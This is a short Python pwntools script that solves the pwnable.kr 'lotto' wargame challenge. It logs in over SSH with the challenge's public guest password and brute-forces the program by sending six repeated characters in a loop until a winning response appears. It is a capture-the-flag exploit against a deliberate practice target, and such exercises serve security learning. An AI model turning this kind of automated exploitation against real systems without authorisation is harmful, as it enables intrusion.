from pwn import *

conn = ssh("lotto", "pwnable.kr", password="guest", port=2222)
prog = conn.process("./lotto")

responses = []
print(prog.recv().decode())

for _ in range(1000):
    for num in range(1, 46):
        prog.sendline("1")
        print(prog.recv().decode())

        s = chr(num) * 6
        prog.sendline(s)
        print("Sent {}".format(s))

        curr_resp = prog.recv().decode()
        print(curr_resp)
        responses += [curr_resp]


for i in responses:
    if "bad" not in i:
        print(i)

